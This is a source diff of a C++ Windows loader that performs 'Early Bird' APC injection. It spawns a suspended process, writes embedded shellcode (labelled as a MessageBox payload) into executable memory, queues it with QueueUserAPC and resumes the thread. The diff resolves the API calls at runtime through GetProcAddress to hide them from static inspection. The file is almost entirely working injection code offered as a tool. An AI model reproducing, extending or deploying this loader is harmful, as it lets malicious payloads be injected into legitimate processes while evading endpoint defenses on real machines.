@@ -1,36 +1,47 @@
 #include <iostream>
 #include <stdlib.h>
 #include <windows.h>
-#include <tlhelp32.h>
 #include <string>
-//#include <winternl.h>
-#include "ntbasic.h"
+//#include "ntbasic.h"
 
-typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(
 
-    IN HANDLE               ProcessHandle,
-    IN OUT PVOID* BaseAddress,
-    IN ULONG                ZeroBits,
-    IN OUT PULONG           RegionSize,
-    IN ULONG                AllocationType,
-    IN ULONG                Protect
-    );
+typedef BOOL (WINAPI* pfnWriteProcessMemory)(
+    IN  HANDLE  hProcess,
+    IN  LPVOID  lpBaseAddress,
+    IN  LPCVOID lpBuffer,
+    IN  SIZE_T  nSize,
+    OUT SIZE_T* lpNumberOfBytesWritten
+);
 
-typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(
+typedef LPVOID (WINAPI* pfnVirtualAllocEx)(
+    IN           HANDLE hProcess,
+    IN OPTIONAL  LPVOID lpAddress,
+    IN           SIZE_T dwSize,
+    IN           DWORD  flAllocationType,
+    IN           DWORD  flProtect
+);
 
-    IN HANDLE               ProcessHandle,
-    IN PVOID                BaseAddress,
-    IN PVOID                Buffer,
-    IN ULONG                NumberOfBytesToWrite,
-    OUT PULONG              NumberOfBytesWritten OPTIONAL
-    );
+typedef DWORD (WINAPI* pfnQueueUserAPC)(
+    IN PAPCFUNC  pfnAPC,
+    IN HANDLE    hThread,
+    IN ULONG_PTR dwData
+);
 
-typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(
+typedef BOOL (WINAPI* pfnCreateProcessW)(
+    IN OPTIONAL       LPCWSTR               lpApplicationName,
+    IN OUT OPTIONAL   LPWSTR                lpCommandLine,
+    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    IN                BOOL                  bInheritHandles,
+    IN                DWORD                 dwCreationFlags,
+    IN OPTIONAL       LPVOID                lpEnvironment,
+    IN OPTIONAL       LPCWSTR               lpCurrentDirectory,
+    IN                LPSTARTUPINFOW        lpStartupInfo,
+    OUT               LPPROCESS_INFORMATION lpProcessInformation
+);
 
-    OUT PHANDLE             ProcessHandle,
-    IN ACCESS_MASK          AccessMask,
-    IN POBJECT_ATTRIBUTES   ObjectAttributes,
-    IN PCLIENT_ID           ClientId
+typedef DWORD (WINAPI* pfnResumeThread)(
+    IN HANDLE hThread
 );
 
 // MessageBox shellcode - 64-bit (exitfunc = thread)
@@ -68,50 +79,75 @@ unsigned char shellcode[] =
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
 //SIZE_T scSize = sizeof(shellcode);
-ULONG scSize = sizeof(shellcode);
+SIZE_T scSize = sizeof(shellcode);
 
-int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, ULONG scSize, DWORD Pid) {
+int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, SIZE_T scSize, DWORD Pid) {
 
     // Define NT imports
     // ------------------------------------------------------------------------------------------------------------
-    pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAllocateVirtualMemory");
-    if (pNtAllocateVirtualMemory == NULL) {
-        printf("[-] NtAllocateVirtualMemory [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtAllocateVirtualMemory, GetLastError());
+    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
+    if (pVirtualAllocEx == NULL) {
+        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
         return -2;
     }
-    printf("[*] NtAllocateVirtualMemory [NTDLL] Address       ->      [ %p ]\n", pNtAllocateVirtualMemory);
-
-    pfnNtWriteVirtualMemory pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtWriteVirtualMemory");
-    if (pNtAllocateVirtualMemory == NULL) {
-        printf("[-] NtWriteVirtualMemory [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtWriteVirtualMemory, GetLastError());
+    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
+    
+    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
+    if (pWriteProcessMemory == NULL) {
+        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
         return -2;
     }
-    printf("[*] NtWriteVirtualMemory [NTDLL] Address       ->      [ %p ]\n", pNtWriteVirtualMemory);
+    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);
 
-    pfnNtOpenProcess pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtOpenProcess");
-    if (pNtAllocateVirtualMemory == NULL) {
-        printf("[-] NtOpenProcess [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtOpenProcess, GetLastError());
+    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
+    if (pQueueUserAPC == NULL) {
+        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
         return -2;
     }
-    printf("[*] NtOpenProcess [NTDLL] Address       ->      [ %p ]\n", pNtOpenProcess);
+    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);
 
+    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
+    if (pResumeThread == NULL) {
+        printf("[-] ResumeThread [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
+        return -2;
+    }
+    printf("[*] ResumeThread [KERNEL32] Address       ->      [ %p ]\n", pResumeThread);
 
     // ------------------------------------------------------------------------------------------------------------
 
-    LPVOID memAlloc = VirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
-    printf("[INFO] Memory allocation pointer: %p", (LPVOID)memAlloc);
+    LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
+    if (!memAlloc) {
+        printf("[ERR] Memory Allocation Failed  [ %d ] \n", GetLastError());
+        return -2;
+    } printf("[INFO] Memory allocation pointer: %p\n", (LPVOID)memAlloc);
 
     SIZE_T bytesWritten = 0;
-    WriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
+    DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
+    if (!wMem) {
+        printf("[ERR] Write Memory Failed  [ %d ] \n", GetLastError());
+        return -2;
+    }
 
-    QueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL);
-
-    ResumeThread(hThread);
-
+    if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
+        Sleep(2000);
+        pResumeThread(hThread);
+    }
     return 0;
 }
 
+
+
 int main() {
+
+    pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
+    if (pCreateProcessW == NULL) {
+        printf("[-] CreateProcessW [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCreateProcessW, GetLastError());
+        return -2;
+    }
+    printf("[*] CreateProcessW [KERNEL32] Address       ->      [ %p ]\n", pCreateProcessW);
+
+    // ------------------------------------------------------------------------------------------------------------
+
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
 
@@ -126,21 +162,17 @@ int main() {
     HANDLE hThread = NULL;
     DWORD Pid = 0;
 
-    BOOL cProcess = CreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    BOOL cProcess = pCreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     if (cProcess == FALSE) {
         printf("[ERR] Process not created\n");
         return 0;
     }
-    printf("[SUCCESS] Process created \n");
-    getchar();
+    //printf("[SUCCESS] Process created \n");
 
     pHandle = pi.hProcess;
     hThread = pi.hThread;
 
     Pid = pi.dwProcessId;
-
-    printf("Process Handle: %p\n", pHandle);
-    printf("Thread Handle: %p\n", hThread);
 
     EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
     CloseHandle(pHandle);
